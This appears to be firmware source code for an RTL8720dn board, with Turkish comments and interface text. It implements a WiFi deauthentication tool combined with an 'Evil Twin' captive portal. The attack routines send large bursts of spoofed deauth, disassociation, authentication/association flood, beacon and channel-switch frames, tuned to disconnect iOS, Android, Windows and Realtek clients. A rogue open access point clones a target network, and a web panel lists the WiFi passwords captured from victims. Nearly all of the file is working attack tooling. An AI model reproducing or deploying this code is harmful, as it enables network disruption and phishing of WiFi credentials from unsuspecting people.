#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "evil_twin.h"

// ─── Yapılandırma ─────────────────────────────────────────────────────────────
char *ssid = "X";
char *pass = "20192019";

// Burst başına frame sayısı
#define FRAMES_PER_DEAUTH     80
// Hedef kanal yenileme aralığı (ms)
#define RESCAN_INTERVAL_MS    30000UL
// İstemci okuma zaman aşımı (ms) — POST body ayrı TCP parçasında gelebilir
#define CLIENT_TIMEOUT_MS     50

// Yaygın kanal listeleri (çift bant tahmini için)
static const uint8_t COMMON_5GHZ[]  = {36, 40, 44, 48, 149, 153, 157, 161};
static const uint8_t COMMON_24GHZ[] = {1, 6, 11};
static const int COMMON_5GHZ_LEN    = 8;
static const int COMMON_24GHZ_LEN   = 3;

// ─── Veri yapıları ────────────────────────────────────────────────────────────
typedef struct {
  String  ssid;
  String  bssid_str;
  uint8_t bssid[6];
  short   rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint8_t bssid[6];
  uint8_t bssid_pair[6];
  bool    has_pair;
  uint8_t channel;
  uint8_t channel_pair;
  String  ssid;
} DeauthTarget;

// ─── Global değişkenler ───────────────────────────────────────────────────────
std::vector<WiFiScanResult> scan_results;
std::vector<DeauthTarget>   deauth_targets;
WiFiServer server(80);
unsigned long last_rescan_ms = 0;
int           guess_5g_idx   = 0;
int           guess_24g_idx  = 0;

// Flood MAC sayacı — locally administered bit (0x02) ile benzersiz MAC üretir
static uint32_t flood_mac_counter = 0x11223344;

// ─── Yardımcı fonksiyonlar ────────────────────────────────────────────────────

bool bssidEqual(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

// Çift band BSSID türet: son oktet ±1
void computePairBSSID(const uint8_t *src, uint8_t channel, uint8_t *pair_out) {
  memcpy(pair_out, src, 6);
  if (channel <= 14) {
    pair_out[5] = src[5] + 1; // 2.4GHz → 5GHz (+1)
  } else {
    pair_out[5] = src[5] - 1; // 5GHz → 2.4GHz (−1)
  }
}

// Tarama sonrası aktif hedeflerin kanal bilgisini güncelle
void updateTargetChannels() {
  for (auto &target : deauth_targets) {
    for (auto &result : scan_results) {
      if (bssidEqual(target.bssid, result.bssid)) {
        target.channel = result.channel;
      }
      if (target.has_pair && bssidEqual(target.bssid_pair, result.bssid)) {
        target.channel_pair = result.channel;
      }
    }
  }
}

// Taramada eş ağ bul (BSSID ilk 5 oktet eşleşmeli, son oktet ±1)
int findPairInScan(uint32_t i) {
  for (uint32_t j = 0; j < scan_results.size(); j++) {
    if (j == i) continue;
    if (memcmp(scan_results[i].bssid, scan_results[j].bssid, 5) == 0) {
      int diff = (int)scan_results[j].bssid[5] - (int)scan_results[i].bssid[5];
      if (diff == 1 || diff == -1) return (int)j;
    }
  }
  return -1;
}

// ─── Saldırı çekirdeği ────────────────────────────────────────────────────────

void nextFloodMAC(uint8_t *mac) {
  flood_mac_counter++;
  mac[0] = 0x02; // locally administered, unicast
  mac[1] = 0xAA;
  mac[2] = (flood_mac_counter >> 24) & 0xFF;
  mac[3] = (flood_mac_counter >> 16) & 0xFF;
  mac[4] = (flood_mac_counter >>  8) & 0xFF;
  mac[5] =  flood_mac_counter        & 0xFF;
}

/*
 * Tek kanal tam saldırı burst'ü — kanal değişikliği yalnızca gerektiğinde.
 *
 * Burst başına (~777 frame, 1 kanal değişikliği, 0 ms gecikme):
 *   ×80 yineleme : deauth×5 + disassoc×3 + auth+assoc flood×1  = 720 frame
 *   /4 yineleme  : probe_resp + null PM=1                       ~  42 frame
 *   /8 yineleme  : beacon flood (iOS)                           ~  10 frame
 *   Kuyruk       : CSA ×5 (ch14/ch0 dönüşümlü)                    5 frame
 */
static uint8_t _last_channel = 0xFF;

void attackBand(uint8_t *bssid, uint8_t channel, const String &ssid_str) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t flood_mac[6];
  uint8_t null_mac[6];
  const char *ssid_c = (ssid_str.length() > 0 && ssid_str != "(hidden)")
                         ? ssid_str.c_str() : nullptr;

  // Kanal yalnızca değişince ayarlanır (wext_set_channel 10–50ms alır)
  if (channel != _last_channel) {
    wext_set_channel(WLAN0_NAME, channel);
    _last_channel = channel;
  }

  uint8_t beacon_ctr = 0;

  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
    // Deauth (tüm platformlar)
    wifi_tx_deauth_frame  (bssid, broadcast, 2);
    wifi_tx_deauth_frame  (bssid, broadcast, 3);
    wifi_tx_deauth_frame  (bssid, broadcast, 4);
    wifi_tx_deauth_frame  (bssid, broadcast, 6);
    wifi_tx_deauth_frame  (bssid, broadcast, 8);
    // Disassoc (iOS + Android — tam yeniden bağlanmayı zorlar)
    wifi_tx_disassoc_frame(bssid, broadcast, 2);
    wifi_tx_disassoc_frame(bssid, broadcast, 3);
    wifi_tx_disassoc_frame(bssid, broadcast, 8);

    // Auth + Assoc flood — PMF'den muaf, AP tablosunu doldurur (Windows PMF ✓)
    nextFloodMAC(flood_mac);
    wifi_tx_auth_frame (bssid, flood_mac);
    wifi_tx_assoc_frame(bssid, flood_mac);

    // Her 4 yinelemede: probe_resp (Realtek/TP-Link) + null PM=1
    if ((i & 3) == 0) {
      if (ssid_c) wifi_tx_probe_resp_frame(bssid, ssid_c, channel);
      nextFloodMAC(null_mac);
      wifi_tx_null_frame(bssid, null_mac);
    }

    // Her 8 yinelemede: beacon flood (iOS reconnect state machine)
    if ((beacon_ctr & 7) == 0 && ssid_c) {
      wifi_tx_beacon_frame(bssid, broadcast, ssid_c, channel);
    }
    beacon_ctr++;
  }

  // Kuyruk: CSA — ch14/ch0 dönüşümlü (Windows + Realtek/TP-Link USB ✓)
  wifi_tx_csa_frame(bssid, 14);
  wifi_tx_csa_frame(bssid,  0);
  wifi_tx_csa_frame(bssid, 14);
  wifi_tx_csa_frame(bssid,  0);
  wifi_tx_csa_frame(bssid, 14);
}

void attackTarget(DeauthTarget &target) {
  attackBand(target.bssid, target.channel, target.ssid);
  if (!target.has_pair) return;
  if (target.channel_pair > 0) {
    attackBand(target.bssid_pair, target.channel_pair, target.ssid);
  } else if (target.channel <= 14) {
    attackBand(target.bssid_pair,
               COMMON_5GHZ[guess_5g_idx++ % COMMON_5GHZ_LEN], target.ssid);
  } else {
    attackBand(target.bssid_pair,
               COMMON_24GHZ[guess_24g_idx++ % COMMON_24GHZ_LEN], target.ssid);
  }
}

// ─── WiFi Tarama ──────────────────────────────────────────────────────────────
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    // Guard against SSID.len == buffer size — would write out-of-bounds
    if (record->SSID.len < sizeof(record->SSID.val)) {
      record->SSID.val[record->SSID.len] = '\0';
    } else {
      record->SSID.val[sizeof(record->SSID.val) - 1] = '\0';
    }
    WiFiScanResult result;
    result.ssid    = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi    = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
      result.bssid[0], result.bssid[1], result.bssid[2],
      result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(3000);
    updateTargetChannels();
    last_rescan_ms = millis();
    return 0;
  }
  return 1;
}

// ─── HTTP Yardımcıları ────────────────────────────────────────────────────────
String parseRequest(const String &request) {
  int first_space = request.indexOf(' ');
  if (first_space < 0) return "/";
  int path_start = first_space + 1;
  int path_end   = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  // Strip query string for routing (keep it simple)
  String path = request.substring(path_start, path_end);
  int q = path.indexOf('?');
  if (q >= 0) path = path.substring(0, q);
  return (path.length() > 0) ? path : "/";
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);

  int start = 0;
  int end   = post_data.indexOf('&', start);
  while (end != -1) {
    String kv    = post_data.substring(start, end);
    int    delim = kv.indexOf('=');
    if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
    start = end + 1;
    end   = post_data.indexOf('&', start);
  }
  String kv    = post_data.substring(start);
  int    delim = kv.indexOf('=');
  if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
  return post_params;
}

// RFC 7231 uyumlu HTTP/1.1 yanıtı (\r\n ile)
static const char* httpStatusText(int code) {
  switch (code) {
    case 200: return "OK";
    case 204: return "No Content";
    case 302: return "Found";
    case 400: return "Bad Request";
    case 404: return "Not Found";
    case 500: return "Internal Server Error";
    default:  return "OK";
  }
}

String makeResponse(int code, String content_type) {
  String r  = "HTTP/1.1 " + String(code) + " " + httpStatusText(code) + "\r\n";
         r += "Content-Type: " + content_type + "\r\n";
         r += "Cache-Control: no-store\r\n";
         r += "Connection: close\r\n\r\n";
  return r;
}

String makeRedirect(String url) {
  return "HTTP/1.1 302 Found\r\nLocation: " + url + "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
}

// ─── Web Arayüzü ──────────────────────────────────────────────────────────────
void handleRoot(WiFiClient &client) {
  bool attacking = (deauth_targets.size() > 0);

  String response;
  response.reserve(8192);
  response = makeResponse(200, "text/html; charset=UTF-8");
  response += R"(<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RTL8720dn Deauther</title>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 960px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
    h1, h2 { color: #2c3e50; }
    table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
    th, td { padding: 9px 12px; text-align: left; border-bottom: 1px solid #ddd; }
    th { background: #2c3e50; color: #fff; }
    tr:nth-child(even) { background: #f0f0f0; }
    .group-header td { background: #dce8f5; font-weight: bold; font-size: 0.85em; color: #1a252f; padding: 4px 12px; }
    .row-2g { background: #eaf4fb !important; border-left: 4px solid #3498db; }
    .row-5g { background: #eafbf1 !important; border-left: 4px solid #27ae60; }
    .badge { display:inline-block; padding:2px 7px; border-radius:3px; font-size:.78em; font-weight:bold; color:#fff; }
    .b2g { background:#3498db; } .b5g { background:#27ae60; }
    form { background:#fff; padding:20px; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin-bottom:20px; }
    input[type=submit] { padding:10px 22px; border:none; border-radius:4px; cursor:pointer; font-size:1em; color:#fff; transition:background .2s; }
    .btn-attack  { background:#e74c3c; } .btn-attack:hover  { background:#c0392b; }
    .btn-stop    { background:#e67e22; } .btn-stop:hover    { background:#ca6f1e; }
    .btn-rescan  { background:#3498db; } .btn-rescan:hover  { background:#2980b9; }
    input[type=text] { padding:7px; border:1px solid #ccc; border-radius:4px; width:90px; margin-right:8px; }
    .cb-grp  { transform:scale(1.3); cursor:pointer; accent-color:#8e44ad; }
    .cb-net  { transform:scale(1.2); cursor:pointer; }
    .status-bar { padding:10px 16px; border-radius:5px; margin-bottom:16px; font-weight:bold; }
    .status-on  { background:#fdecea; border:1px solid #e74c3c; color:#c0392b; }
    .status-off { background:#eafaf1; border:1px solid #27ae60; color:#1e8449; }
  </style>
  <script>
    function toggleGroup(id) {
      var cb = document.getElementById('grp_' + id);
      document.querySelectorAll('.grp_' + id).forEach(function(el){ el.checked = cb.checked; });
    }
  </script>
</head>
<body>
  <h1>&#9889; RTL8720dn Deauther</h1>
)";

  if (attacking) {
    response += "<div class='status-bar status-on'>&#128308; SALDIRI AKTIF &mdash; ";
    response += String(deauth_targets.size());
    response += " hedef | Otomatik yeniden tarama her 30s</div>";
  } else {
    response += "<div class='status-bar status-off'>&#128994; BEKLEME &mdash; Aktif saldiri yok</div>";
  }

  response += "<form method='post' action='/stop' style='display:inline-block;margin-right:10px;padding:10px 16px;'>";
  response += "<input class='btn-stop' type='submit' value='&#9632; Saldiriyi Durdur'></form>";
  response += "<form method='post' action='/rescan' style='display:inline-block;padding:10px 16px;'>";
  response += "<input class='btn-rescan' type='submit' value='&#8635; Yeniden Tara'></form><br><br>";

  response += "<h2>WiFi Aglari</h2>";
  response += "<form method='post' action='/deauth'>";
  response += "<table><tr><th>Grup</th><th>Sec</th><th>#</th><th>SSID</th><th>BSSID</th><th>Kanal</th><th>RSSI</th><th>Bant</th></tr>";

  std::vector<bool> rendered(scan_results.size(), false);
  int group_id = 0;

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (rendered[i]) continue;
    int pair_idx = findPairInScan(i);

    if (pair_idx != -1 && !rendered[pair_idx]) {
      int idx_2g = (scan_results[i].channel <= 14) ? (int)i : pair_idx;
      int idx_5g = (scan_results[i].channel <= 14) ? pair_idx : (int)i;
      String gid   = String(group_id);
      String label = et_html_escape((scan_results[idx_2g].ssid.length() > 0)
                       ? scan_results[idx_2g].ssid : "(gizli)");

      response += "<tr class='group-header'><td colspan='8'>&#128279; Eslestirilmis Modem &mdash; " + label;
      response += " &nbsp;<input class='cb-grp' type='checkbox' id='grp_" + gid + "' onclick='toggleGroup(" + gid + ")'> Ikisini Sec</td></tr>";

      String s2g = et_html_escape((scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(gizli)");
      response += "<tr class='row-2g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_2g) + "'></td>";
      response += "<td>" + String(idx_2g) + "</td><td>" + s2g + "</td>";
      response += "<td>" + scan_results[idx_2g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_2g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_2g].rssi) + " dBm</td>";
      response += "<td><span class='badge b2g'>2.4GHz</span></td></tr>";

      String s5g = et_html_escape((scan_results[idx_5g].ssid.length() > 0) ? scan_results[idx_5g].ssid : "(gizli)");
      response += "<tr class='row-5g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_5g) + "'></td>";
      response += "<td>" + String(idx_5g) + "</td><td>" + s5g + "</td>";
      response += "<td>" + scan_results[idx_5g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_5g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_5g].rssi) + " dBm</td>";
      response += "<td><span class='badge b5g'>5GHz</span></td></tr>";

      rendered[i] = rendered[pair_idx] = true;
      group_id++;

    } else {
      String label = et_html_escape((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)");
      bool   is5g  = (scan_results[i].channel >= 36);
      String rowcls = is5g ? "row-5g" : "row-2g";
      String badgec = is5g ? "b5g" : "b2g";
      String band   = is5g ? "5GHz" : "2.4GHz";

      response += "<tr class='" + rowcls + "'><td></td>";
      response += "<td><input class='cb-net' type='checkbox' name='network' value='" + String(i) + "'></td>";
      response += "<td>" + String(i) + "</td><td>" + label + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + String(scan_results[i].rssi) + " dBm</td>";
      response += "<td><span class='badge " + badgec + "'>" + band + "</span></td></tr>";
      rendered[i] = true;
    }
  }

  response += "</table>";
  response += "<p style='font-size:.85em;color:#555;'>Her burst: <b>reason 2,3,4,6,8</b> (Deauth) + <b>2,3,8</b> (Disassoc) + Auth/Assoc Flood + CSA + Null PM=1 + Beacon Flood</p>";
  response += "<input class='btn-attack' type='submit' value='&#9889; Saldiriyi Baslat'></form>";

  // ── Evil Twin bölümü ───────────────────────────────────────────────────────
  response += "<h2>&#128126; Evil Twin &mdash; Captive Portal</h2>";
  response += "<div style='background:#fff;padding:20px;border-radius:6px;box-shadow:0 2px 5px rgba(0,0,0,.1);margin-bottom:20px;'>";

  if (evil_twin_active) {
    response += "<div style='background:#fdecea;border:1px solid #e74c3c;border-radius:5px;padding:10px 14px;margin-bottom:10px;font-weight:bold;color:#c0392b;'>";
    response += "&#128308; Evil Twin AKTIF &mdash; SSID: <b>" + et_html_escape(evil_twin_ssid) + "</b>";
    response += " &nbsp;|&nbsp; Kanal: " + String(evil_twin_channel);
    response += " &nbsp;|&nbsp; Bagli istemci: " + String(evil_twin_clients);
    if (evil_twin_dual_band) {
      response += "<br><span style='font-size:.85em;'>&#128225; Cift Bant &mdash;";
      response += " 2.4GHz CH:" + String(evil_twin_channel <= 13 ? evil_twin_channel : evil_twin_channel2);
      response += " &nbsp;|&nbsp; 5GHz CH:" + String(evil_twin_channel >= 36 ? evil_twin_channel : evil_twin_channel2);
      if (evil_twin_ssid2.length() > 0 && evil_twin_ssid2 != evil_twin_ssid)
        response += " &nbsp;|&nbsp; 5GHz SSID: " + et_html_escape(evil_twin_ssid2);
      response += "</span>";
    }
    response += "</div>";

    if (et_password_count > 0) {
      response += "<div style='background:#eafaf1;border:1px solid #27ae60;border-radius:5px;padding:10px 14px;margin-bottom:10px;'>";
      response += "<b>&#128273; Yakalanan Sifreler (" + String(et_password_count) + "):</b><br>";
      for (int i = 0; i < et_password_count; i++) {
        response += "<span style='font-family:monospace;background:#f0f0f0;padding:2px 8px;border-radius:3px;margin-right:6px;margin-top:4px;display:inline-block;'>";
        response += et_html_escape(et_passwords[i].ssid) + " &rarr; <b>" + et_html_escape(et_passwords[i].password) + "</b>";
        if (et_passwords[i].verified) response += " <span style='color:#27ae60;'>&#9989; Dogrulandi</span>";
        response += "</span>";
      }
      response += "</div>";
    }

    response += "<form method='post' action='/stop_evil_twin'>";
    response += "<input type='submit' style='padding:10px 22px;border:none;border-radius:4px;cursor:pointer;font-size:1em;color:#fff;background:#e67e22;' value='&#9632; Evil Twin Durdur'>";
    response += "</form>";

  } else {
    response += "<p style='font-size:.88em;color:#555;margin-bottom:12px;'>"
                "Hedef agin SSID&apos;sini klonlar, sahte (acik) bir AP baslatilar. "
                "Gercek AP&apos;ye deauth gondererek istemcileri koparir. "
                "2.4GHz ve 5GHz aglari otomatik tespit edilerek "
                "<b>her iki banda saldiri yapilir</b>. "
                "Baglanan kurbanlar <b>captive portal</b> uzerinden WiFi sifresini girmek zorunda kalir.</p>";

    response += "<form method='post' action='/evil_twin'>";
    response += "<label style='font-size:.9em;color:#333;font-weight:600;'>Hedef AG:</label><br>";
    response += "<select name='idx' style='padding:8px 10px;border:1px solid #ccc;border-radius:4px;"
                "font-size:.92em;width:100%;max-width:480px;margin-top:6px;margin-bottom:10px;"
                "background:#fafafa;'>";
    response += "<option value='-1' disabled selected>-- Ag secin --</option>";

    for (uint32_t i = 0; i < scan_results.size(); i++) {
      String label = et_html_escape((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)");
      bool   is5g  = (scan_results[i].channel >= 36);
      response += "<option value='" + String(i) + "'>";
      response += "[" + String(i) + "] ";
      response += label;
      response += " (CH:" + String(scan_results[i].channel) + ", ";
      response += is5g ? "5GHz" : "2.4GHz";
      response += ", " + scan_results[i].bssid_str + ")";
      response += "</option>";
    }

    response += "</select><br>";
    response += "<input type='submit' style='padding:10px 22px;border:none;border-radius:4px;"
                "cursor:pointer;font-size:1em;color:#fff;background:#8e44ad;' "
                "value='&#128126; Evil Twin Baslat'>";
    response += "</form>";
  }
  response += "</div>";

  // Aktif hedefler tablosu
  if (attacking) {
    response += "<h2>Aktif Hedefler</h2><table>";
    response += "<tr><th>#</th><th>SSID</th><th>Birincil BSSID</th><th>Kanal</th><th>Es BSSID</th><th>Es Kanal</th></tr>";
    for (uint32_t i = 0; i < deauth_targets.size(); i++) {
      char pbssid[18] = {0};
      if (deauth_targets[i].has_pair) {
        snprintf(pbssid, sizeof(pbssid), "%02X:%02X:%02X:%02X:%02X:%02X",
          deauth_targets[i].bssid_pair[0], deauth_targets[i].bssid_pair[1],
          deauth_targets[i].bssid_pair[2], deauth_targets[i].bssid_pair[3],
          deauth_targets[i].bssid_pair[4], deauth_targets[i].bssid_pair[5]);
      } else {
        strncpy(pbssid, "&mdash;", sizeof(pbssid) - 1);
      }
      char pbssid_str[18];
      snprintf(pbssid_str, sizeof(pbssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
        deauth_targets[i].bssid[0], deauth_targets[i].bssid[1],
        deauth_targets[i].bssid[2], deauth_targets[i].bssid[3],
        deauth_targets[i].bssid[4], deauth_targets[i].bssid[5]);

      response += "<tr><td>" + String(i) + "</td>";
      response += "<td>" + et_html_escape(deauth_targets[i].ssid) + "</td>";
      response += "<td>" + String(pbssid_str) + "</td>";
      response += "<td>" + String(deauth_targets[i].channel) + "</td>";
      response += "<td>" + String(pbssid) + "</td>";
      response += "<td>" + (deauth_targets[i].channel_pair > 0
                               ? String(deauth_targets[i].channel_pair)
                               : String("?")) + "</td>";
      response += "</tr>";
    }
    response += "</table>";
  }

  response += R"(
  <h2>Evrensel Saldiri Matrisi (Her Burst)</h2>
  <table>
    <tr><th>Frame Tipi</th><th>Miktar</th><th>Mekanizma</th><th>Hedef Platform</th></tr>
    <tr>
      <td>Deauth 0xC0</td><td>reason 2,3,4,6,8 &times;80</td>
      <td>AP&rarr;Broadcast, delay=0, kesintisiz baskinc</td>
      <td>Android &#10003; &nbsp; iOS &#10003; &nbsp; Windows (PMF yok) &#10003;</td>
    </tr>
    <tr>
      <td>Disassoc 0xA0</td><td>reason 2,3,8 &times;80</td>
      <td>Tam re-assoc zorlar, deauth ile birlikte ic ice</td>
      <td>Android &#10003; &nbsp; iOS &#10003;</td>
    </tr>
    <tr style="background:#fff3cd;">
      <td>Auth Flood 0xB0</td><td>unique MAC &times;80</td>
      <td>PMF-exempt &mdash; AP association tablosunu doldurur</td>
      <td><b>Windows PMF &#10003;</b></td>
    </tr>
    <tr style="background:#fff3cd;">
      <td>Assoc Flood 0x00</td><td>unique MAC &times;80</td>
      <td>Auth flood ile tum AP slotlarini kilitler</td>
      <td><b>Windows PMF &#10003;</b></td>
    </tr>
    <tr style="background:#fce8ff;">
      <td>Probe Resp 0x0050</td><td>caps=0x0001 (open) &times;~20</td>
      <td>Realtek surucu "AP guvenligi kaldirdi" sanir &rarr; keser &rarr; deauth bloku</td>
      <td><b>TP-Link/Realtek USB &#10003;</b></td>
    </tr>
    <tr style="background:#e8f4f8;">
      <td>Beacon Flood 0x80</td><td>hedef SSID &times;~10</td>
      <td>iOS reconnect state machine mesgul eder</td>
      <td><b>iOS &#10003;</b></td>
    </tr>
    <tr style="background:#e8f4f8;">
      <td>Null Data PM=1</td><td>unique MAC &times;~20</td>
      <td>AP buffer dolar &rarr; frame teslim edilemez</td>
      <td><b>iOS &#10003; &nbsp; Android &#10003;</b></td>
    </tr>
    <tr style="background:#ffe0e0;">
      <td>CSA 0xD0</td><td>ch14+ch0 &times;5 (kuyruk)</td>
      <td>Ardisik 2 gecersiz kanal &mdash; surucu hicbirine yerlesemez</td>
      <td><b>Windows &#10003; &nbsp; TP-Link/Realtek USB &#10003;</b></td>
    </tr>
  </table>
  <p style="font-size:.85em;color:#666;">
    <b>~777 frame/kanal &bull; kanal gecisi sadece kanal degisince &bull; delay=0 &bull; TX gucu %100 &bull; power-save kapali &bull; packed structs</b>
  </p>
</body></html>)";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String r = makeResponse(404, "text/plain") + "Not found!";
  client.write(r.c_str());
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
  // delfyRTL (gorebrau) referans: WiFi.enableConcurrent() STA+AP eş zamanlı
  // çalışmasını etkinleştirir. Bu olmadan STA tarama sırasında AP çakışabilir.
  WiFi.enableConcurrent();
  delay(100);

  // Yönetim AP'sini başlat (şifreli — sadece yönetim erişimi için)
  WiFi.disconnect();
  delay(300);
  WiFi.apbegin(ssid, pass, "1");
  delay(500);

  // RF maksimum performans: IPS + LPS devre dışı bırak
  wifi_disable_powersave();

  // Başlangıç taraması
  while (scanNetworks()) delay(1000);
  server.begin();
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
  // ── Web sunucusu ──
  WiFiClient client = server.available();
  if (client.connected()) {
    String request;
    {
      unsigned long _t = millis();
      while (client.connected() && (millis() - _t < CLIENT_TIMEOUT_MS)) {
        if (client.available()) {
          request += (char)client.read();
          _t = millis(); // Her byte'ta zaman aşımını sıfırla
        }
      }
    }
    String path = parseRequest(request);

    // Evil Twin Captive Portal — önce kontrol et
    if (evil_twin_portal_handle(client, request, path)) {
      client.stop();
      return;
    }

    if (path == "/") {
      handleRoot(client);

    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      client.stop();
      scanNetworks();
      return;

    } else if (path == "/stop") {
      deauth_targets.clear();
      client.write(makeRedirect("/").c_str());

    } else if (path == "/evil_twin") {
      std::vector<std::pair<String,String>> post_data = parsePost(request);
      int idx = -1;
      for (auto &p : post_data) {
        if (p.first == "idx") { idx = p.second.toInt(); break; }
      }

      // Yanıt ve bağlantı kapama ÖNCE yapılmalı — WiFi.apbegin() TCP soketi öldürmeden.
      // /rescan ile aynı desen: response → client.stop() → ağır işlem → return
      client.write(makeRedirect("/").c_str());
      client.stop();

      if (idx >= 0 && idx < (int)scan_results.size()) {
        deauth_targets.clear();

        // Birinci band parametreleri
        evil_twin_ssid    = (scan_results[idx].ssid.length() > 0)
                              ? scan_results[idx].ssid : "WiFi";
        evil_twin_channel = scan_results[idx].channel;
        memcpy(evil_twin_bssid, scan_results[idx].bssid, 6);

        // İkinci band otomatik tespiti (4 öncelik + fallback)
        evil_twin_dual_band = false;
        evil_twin_channel2  = 0;
        memset(evil_twin_bssid2, 0, 6);
        evil_twin_ssid2     = "";

        int best_score = 0;

        for (int j = 0; j < (int)scan_results.size(); j++) {
          if (j == idx) continue;

          bool prim_24  = (scan_results[idx].channel <= 13);
          bool cand_24  = (scan_results[j].channel   <= 13);
          bool diff_band = (prim_24 != cand_24);
          if (!diff_band) continue;

          uint8_t *bA = scan_results[idx].bssid;
          uint8_t *bB = scan_results[j].bssid;
          String   sA = scan_results[idx].ssid;
          String   sB = scan_results[j].ssid;

          bool same_oui     = (memcmp(bA, bB, 3) == 0);
          bool first5_match = (memcmp(bA, bB, 5) == 0);
          int  last_diff    = abs((int)bB[5] - (int)bA[5]);

          int score = 0;
          if (first5_match && last_diff == 1)          score = 100; // BSSID ±1
          else if (first5_match && last_diff <= 4)     score = 80;  // BSSID ±2..4
          else if (sA == sB && same_oui)               score = 60;  // aynı SSID + OUI
          else if (same_oui &&
                   ((sB.startsWith(sA) && sB.length() > sA.length()) ||
                    (sA.startsWith(sB) && sA.length() > sB.length()))) score = 40;
          else if (sA == sB)                           score = 20;  // sadece SSID

          if (score > best_score) {
            best_score          = score;
            evil_twin_dual_band = true;
            evil_twin_channel2  = scan_results[j].channel;
            memcpy(evil_twin_bssid2, bB, 6);
            evil_twin_ssid2     = (sB.length() > 0) ? sB : sA;
          }
        }

        // Fallback: band-steering modem yalnızca tek SSID gösteriyor olabilir
        if (!evil_twin_dual_band) {
          computePairBSSID(scan_results[idx].bssid,
                           scan_results[idx].channel,
                           evil_twin_bssid2);
          evil_twin_channel2  = (scan_results[idx].channel <= 13) ? 36 : 6;
          evil_twin_ssid2     = evil_twin_ssid;
          evil_twin_dual_band = true;
        }

        start_evil_twin(idx);
      }
      return;

    } else if (path == "/stop_evil_twin") {
      // Aynı desen: yanıt önce gönderilir, AP sonra değiştirilir
      client.write(makeRedirect("/").c_str());
      client.stop();
      stop_evil_twin();
      return;

    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      std::vector<int> selected_indices;

      for (auto &param : post_data) {
        if (param.first == "network") {
          selected_indices.push_back(String(param.second).toInt());
        }
      }

      for (int sel_idx : selected_indices) {
        if (sel_idx < 0 || sel_idx >= (int)scan_results.size()) continue;

        bool already = false;
        for (auto &t : deauth_targets) {
          if (bssidEqual(t.bssid, scan_results[sel_idx].bssid)) { already = true; break; }
        }
        if (already) continue;

        DeauthTarget target;
        memcpy(target.bssid, scan_results[sel_idx].bssid, 6);
        target.channel      = scan_results[sel_idx].channel;
        target.ssid         = (scan_results[sel_idx].ssid.length() > 0)
                                ? scan_results[sel_idx].ssid : "(gizli)";
        target.channel_pair = 0;

        computePairBSSID(target.bssid, target.channel, target.bssid_pair);
        target.has_pair = true;

        for (auto &result : scan_results) {
          if (bssidEqual(target.bssid_pair, result.bssid)) {
            target.channel_pair = result.channel;
            break;
          }
        }

        deauth_targets.push_back(target);
      }

      client.write(makeRedirect("/").c_str());

    } else {
      handle404(client);
    }

    client.stop();
  }

  // ── Evil Twin döngüsü — aktifken normal deauth çalışmasın ──
  if (evil_twin_active) {
    evil_twin_loop();
    return;
  }

  // ── Deauth saldırı döngüsü ──
  if (deauth_targets.size() == 0) return;

  // Periyodik yeniden tarama (modem resetlenip kanal değişmiş olabilir)
  if (millis() - last_rescan_ms >= RESCAN_INTERVAL_MS) {
    scanNetworks();
  }

  for (uint32_t i = 0; i < deauth_targets.size(); i++) {
    attackTarget(deauth_targets[i]);
  }
}
